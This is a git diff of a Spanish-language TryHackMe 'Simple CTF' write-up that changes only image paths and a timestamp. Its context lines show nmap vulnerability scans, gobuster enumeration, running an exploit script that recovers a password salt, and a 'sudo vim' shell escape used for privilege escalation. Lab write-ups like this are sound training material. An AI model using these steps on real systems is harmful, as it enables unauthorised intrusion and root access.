@@ -1,7 +1,7 @@
 ---
 publish: true
 created: 2026-09-11T12:16:55.959Z
-modified: 2026-09-11T12:24:57.416Z
+modified: 2026-09-11T18:12:58.633Z
 ---
 
 # Simple CTF
@@ -29,7 +29,7 @@ sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn <%IP%> -oG targeted
 
 ```
 
-![image.png](/images/TryHackMe/image.png)
+![image.png](WriteUps/images/TryHackMe/image.png)
 
 ### **Enumeración de servicios**
 
@@ -48,11 +48,11 @@ sudo nmap -v -sV -O --script="safe and vuln" -T4 -n -Pn -p135,445 -oA nmap <%IP%
 
 ```
 
-![image.png](/images/TryHackMe/image%201.png)
+![image.png](WriteUps/images/TryHackMe/image 1.png)
 
 Miramos la web y el contenido de robots.txt
 
-![image.png](/images/TryHackMe/image%202.png)
+![image.png](WriteUps/images/TryHackMe/image 2.png)
 
 Vemos que el directorio no esta visible
 Probamos con gobuster
@@ -66,7 +66,7 @@ Output:
 
 ```
 
-![image.png](/images/TryHackMe/image%203.png)
+![image.png](WriteUps/images/TryHackMe/image 3.png)
 
 ## Explotación
 
@@ -89,7 +89,7 @@ NOTA: Ejecutamos el script. Para que funcione con python3, ha que poner con () t
 python3 46635.py
 ```
 
-![image.png](/images/TryHackMe/image%204.png)
+![image.png](WriteUps/images/TryHackMe/image 4.png)
 
 ```bash
 +] Salt for password found: 1dac0d92e9fa6bb2
@@ -144,7 +144,7 @@ sudo vim -c ':!/bin/sh'
 
 Probamos a obtener la shell:
 
-![image.png](/images/TryHackMe/image%205.png)
+![image.png](WriteUps/images/TryHackMe/image 5.png)
 
 ### Obtención de user.txt
 
